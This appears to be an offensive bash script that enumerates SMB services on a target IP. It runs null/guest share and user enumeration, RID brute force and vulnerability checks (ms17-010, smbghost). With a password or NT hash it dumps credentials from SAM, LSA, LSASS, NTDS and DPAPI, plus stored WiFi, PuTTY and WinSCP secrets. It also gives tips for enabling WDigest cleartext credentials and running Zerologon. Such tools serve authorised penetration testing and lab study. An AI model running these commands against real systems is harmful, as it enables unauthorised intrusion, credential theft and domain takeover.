#!/usr/bin/env bash
set -euo pipefail
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly CYAN='\033[0;36m'
readonly NC='\033[0m'
readonly SCRIPT_NAME="$(basename "$0")"
readonly TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
log_warning() { echo -e "${YELLOW}[!] $*${NC}"; }
log_error() { echo -e "${RED}[-] $*${NC}" >&2; }
log_info() { echo -e "${GREEN}[+] $*${NC}"; }
log_step() { echo -e "${BLUE}[>] $*${NC}"; }
section_header() {
    local title="$1"
    local width=60
    local padding=$(( (width - ${#title} - 2) / 2 ))
    echo
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo -e "${CYAN}$(printf ' %.0s' $(seq 1 $padding))${title}${NC}"
    echo -e "${CYAN}$(printf '=%.0s' $(seq 1 $width))${NC}"
    echo
}
echo -e "${CYAN}=== SMB Enumeration Master Script ===${NC}"
echo "Select scan type:"
echo "  1) Unauthenticated Scan (Null/Guest session enumeration & vuln checks)"
echo "  2) Authenticated Scan (User creds required)"
read -rp "Enter choice [1-2]: " scan_choice
case "$scan_choice" in
    1)
        echo
        read -rp "Enter Target IP: " TARGET_IP
        if [[ -z "${TARGET_IP}" ]]; then
            log_error "Target IP cannot be empty."
            exit 1
        fi
        readonly TARGET_IP
        readonly OUT_DIR="results_noauth_smb/${TARGET_IP}_${TIMESTAMP}"
        readonly DOWNLOAD_DIR="${OUT_DIR}/downloads"
        mkdir -p "${OUT_DIR}" "${DOWNLOAD_DIR}"
        readonly LOG_SHARES="${OUT_DIR}/shares.log"
        readonly LOG_USERS="${OUT_DIR}/users.log"
        readonly LOG_GROUPS="${OUT_DIR}/groups.log"
        readonly LOG_POLICY="${OUT_DIR}/password_policy.log"
        readonly LOG_RPC="${OUT_DIR}/rpcclient.log"
        readonly LOG_VULNS="${OUT_DIR}/vulnerabilities.log"
        readonly LOG_NMAP="${OUT_DIR}/nmap.log"
        readonly LOG_ENUM4LINUX="${OUT_DIR}/enum4linux.log"
        readonly USERS_FILE="${OUT_DIR}/users.txt"
        print_vuln_commands() {
            return 0
        }
        enum_shares() {
            section_header "SHARE ENUMERATION"
            log_step "smbclient - list shares"
            smbclient -N -L "\\\\${TARGET_IP}\\\\" 2>&1 | tee -a "${LOG_SHARES}" || log_warning "smbclient null session failed"
            echo >> "${LOG_SHARES}"
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "netexec - share listing (${cred})"
                nxc smb "${TARGET_IP}" -u "${user}" -p "" --shares 2>&1 | tee -a "${LOG_SHARES}" || log_warning "nxc --shares (${cred}) failed"
            done
            echo >> "${LOG_SHARES}"
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "smbmap - share permissions (${cred})"
                smbmap -H "${TARGET_IP}" -u "${user}" -p "" 2>&1 | tee -a "${LOG_SHARES}" || log_warning "smbmap (${cred}) failed"
            done
        }
        enum_users() {
            section_header "USER ENUMERATION"
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "netexec - --users (${cred})"
                nxc smb "${TARGET_IP}" -u "${user}" -p "" --users 2>&1 | tee -a "${LOG_USERS}" || log_warning "nxc --users (${cred}) failed"
            done
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "netexec - RID brute (${cred})"
                nxc smb "${TARGET_IP}" -u "${user}" -p "" --rid-brute 2>&1 | tee -a "${LOG_USERS}" || log_warning "RID brute (${cred}) failed"
            done
            log_step "rpcclient - enumdomusers / querydispinfo"
            { echo "enumdomusers"; echo "querydispinfo"; } | rpcclient -U "" -N "${TARGET_IP}" 2>&1 | tee -a "${LOG_USERS}" || log_warning "rpcclient user enum failed"
            if [[ -f "${LOG_USERS}" ]]; then
                awk '{print $5}' "${LOG_USERS}" | sed '1,3d;$d' | sort -u > "${USERS_FILE}" 2>/dev/null || true
                if [[ -s "${USERS_FILE}" ]]; then
                    log_info "Extracted $(wc -l < "${USERS_FILE}") username(s) → ${USERS_FILE}"
                fi
            fi
        }
        enum_groups() {
            section_header "GROUP ENUMERATION"
            log_step "rpcclient - enumdomgroups / enumalsgroups"
            { echo "enumdomgroups"; echo "enumalsgroups builtin"; echo "enumalsgroups domain"; } | rpcclient -U "" -N "${TARGET_IP}" 2>&1 | tee -a "${LOG_GROUPS}" || log_warning "rpcclient group enum failed"
        }
        enum_host_info() {
            section_header "DOMAIN / HOST INFO"
            log_step "rpcclient - srvinfo / lsaquery / enumdomains / querydominfo"
            { echo "srvinfo"; echo "lsaquery"; echo "enumdomains"; echo "querydominfo"; } | rpcclient -U "" -N "${TARGET_IP}" 2>&1 | tee -a "${LOG_RPC}" || log_warning "rpcclient host info failed"
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "netexec - host info (${cred})"
                nxc smb "${TARGET_IP}" -u "${user}" -p "" 2>&1 | tee -a "${LOG_RPC}" || true
            done
        }
        enum_password_policy() {
            section_header "PASSWORD POLICY"
            for cred in "guest" "null"; do
                local user="${cred}"
                [[ "${cred}" == "null" ]] && user=""
                log_step "netexec - --pass-pol (${cred})"
                nxc smb "${TARGET_IP}" -u "${user}" -p "" --pass-pol 2>&1 | tee -a "${LOG_POLICY}" || log_warning "nxc --pass-pol (${cred}) failed"
            done
            log_step "rpcclient - getdompwinfo / passpol"
            { echo "getdompwinfo"; echo "passpol"; } | rpcclient -U "" -N "${TARGET_IP}" 2>&1 | tee -a "${LOG_POLICY}" || log_warning "rpcclient password policy failed"
        }
        enum_nmap() {
            section_header "NMAP SMB SCRIPTS"
            nmap -Pn -p445 -sV --script "smb-security-mode,smb-protocols,smb2-capabilities" "${TARGET_IP}" 2>&1 | tee "${LOG_NMAP}" || log_warning "Nmap scan failed"
        }
        enum_enum4linux() {
            section_header "ENUM4LINUX-NG"
            enum4linux-ng -A "${TARGET_IP}" 2>&1 | tee "${LOG_ENUM4LINUX}" || log_warning "enum4linux-ng failed"
        }
        enum_vulnerabilities() {
            section_header "VULNERABILITY CHECKS"
            local modules=(ms17-010 smbghost enum_av enum_ca gpp_autologin gpp_password spooler webdav ioxidresolver)
            for module in "${modules[@]}"; do
                log_step "Module: ${module}"
                for cred in "guest" "null"; do
                    local user="${cred}"
                    [[ "${cred}" == "null" ]] && user=""
                    nxc smb "${TARGET_IP}" -u "${user}" -p "" -M "${module}" 2>&1 | tee -a "${LOG_VULNS}" || true
                done
                echo >> "${LOG_VULNS}"
            done
        }
        print_summary() {
            section_header "SUMMARY"
            echo -e "${GREEN}Results saved to: ${OUT_DIR}/${NC}"
            echo
            echo -e "  Shares     → ${LOG_SHARES}"
            echo -e "  Users      → ${LOG_USERS}"
            echo -e "  Groups     → ${LOG_GROUPS}"
            echo -e "  Host Info  → ${LOG_RPC}"
            echo -e "  Pass Policy → ${LOG_POLICY}"
            echo -e "  Vulns      → ${LOG_VULNS}"
            echo -e "  Nmap       → ${LOG_NMAP}"
            echo -e "  Enum4linux → ${LOG_ENUM4LINUX}"
            [[ -s "${USERS_FILE}" ]] && echo -e "  User List   → ${USERS_FILE}"
            echo
            echo -e "${YELLOW}[!] No creds? Try usernames-as-passwords.${NC}"
            echo
            print_vuln_commands
        }
        echo -e "${NC}"
        echo "Target : ${TARGET_IP}"
        echo "Output : ${OUT_DIR}"
        echo
        enum_shares
        enum_users
        enum_groups
        enum_host_info
        enum_password_policy
        enum_enum4linux
        enum_vulnerabilities
        enum_nmap
        print_summary
        ;;
    2)
        echo
        read -rp "Enter Target IP (-t): " IP
        read -rp "Enter Username (-u): " USER
        read -rp "Enter Password (-p) [Leave blank if using NTHash]: " PASS
        read -rp "Enter NTHash (-H) [Leave blank if using Password]: " HASH
        read -rp "Enter Domain (-d) [Leave blank for local auth]: " DOMAIN
        [[ -z "$IP" || -z "$USER" ]] && { echo "Missing IP or Username"; exit 1; }
        [[ -z "$PASS" && -z "$HASH" ]] && { echo "Provide either Password or NTHash"; exit 1; }
        [[ -n "$PASS" && -n "$HASH" ]] && { echo "Cannot use both Password and NTHash"; exit 1; }
        command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }
        auth_log() { echo -e "\n==== $* ====\n"; }
        AUTH_ARGS=()
        [[ -n "$DOMAIN" ]] && AUTH_ARGS=(-d "$DOMAIN") || AUTH_ARGS=(--local-auth)
        if [[ -n "$HASH" ]]; then
          AUTH_ARGS+=(-u "$USER" -H "$HASH")
          LDAP_AUTH=(-d "$DOMAIN" -u "$USER" -H "$HASH")
        else
          AUTH_ARGS+=(-u "$USER" -p "$PASS")
          LDAP_AUTH=(-d "$DOMAIN" -u "$USER" -p "$PASS")
        fi
        auth_log "Auth mode: $([[ -n "$DOMAIN" ]] && echo "domain" || echo "local") ($([[ -n "$HASH" ]] && echo "hash" || echo "password"))"
        auth_log "nmap safe SMB scripts"
        nmap -Pn -p445 -sV --script "smb-security-mode,smb-protocols,smb2-capabilities,smb-vuln-ms17-010" "$IP" || true
        echo
        OUTDIR="results_auth_smb"
        mkdir -p "$OUTDIR"
        OUTFILE="$OUTDIR/auth_smb_usernames.txt"
        FLAGS=(--shares --users-export --pass-pol --loggedon-users --qwinsta)
        for f in "${FLAGS[@]}"; do
          auth_log "SMB flag: $f"
          if [[ "$f" == "--users-export" ]]; then
            nxc smb "$IP" "${AUTH_ARGS[@]}" "$f" "$OUTFILE"
            auth_log "Usernames saved to $OUTFILE"
          else
            nxc smb "$IP" "${AUTH_ARGS[@]}" "$f" || true
          fi
        done
        if [[ -n "$DOMAIN" ]]; then
          auth_log "LDAP: --groups"
          nxc ldap "$IP" "${LDAP_AUTH[@]}" --groups || true
        else
          auth_log "Skip LDAP (needs domain auth)"
        fi
        for dpapi in "" "cookies" "nosystem"; do
          auth_log "DPAPI${dpapi:+ $dpapi}"
          nxc smb "$IP" "${AUTH_ARGS[@]}" --dpapi ${dpapi} || true
        done
        if [[ -z "$DOMAIN" ]]; then
          LOCAL_ADMIN_MODULES=(sam lsa lsass ntds gmsa)
          for m in "${LOCAL_ADMIN_MODULES[@]}"; do
            auth_log "Module (local-admin): $m"
            nxc smb "$IP" "${AUTH_ARGS[@]}" -M "$m" || true
          done
        else
          MODULES=(laps gpp_password gpp_autologin wifi putty powershell_history lsassy nanodump mremoteng notepad++ winscp vnc wifi reg-winlogon rdcman backup_operator)
          for m in "${MODULES[@]}"; do
            auth_log "Module: $m"
            nxc smb "$IP" "${AUTH_ARGS[@]}" -M "$m" || true
          done
        fi
        auth_log "Done"
        auth_log "Tips & Hints"
        cat <<'EOT'
- Domain mode is used when -d <DOMAIN> is provided; otherwise uses --local-auth.
- Extra manual modules:
    * WDigest (enable cleartext creds):
        nxc smb <IP> <auth> -M wdigest -o ACTION=enable
    * Zerologon (lab use only):
        nxc smb <IP> <auth> -M zerologon
EOT
        ;;
    *)
        log_error "Invalid choice."
        exit 1
        ;;
esac
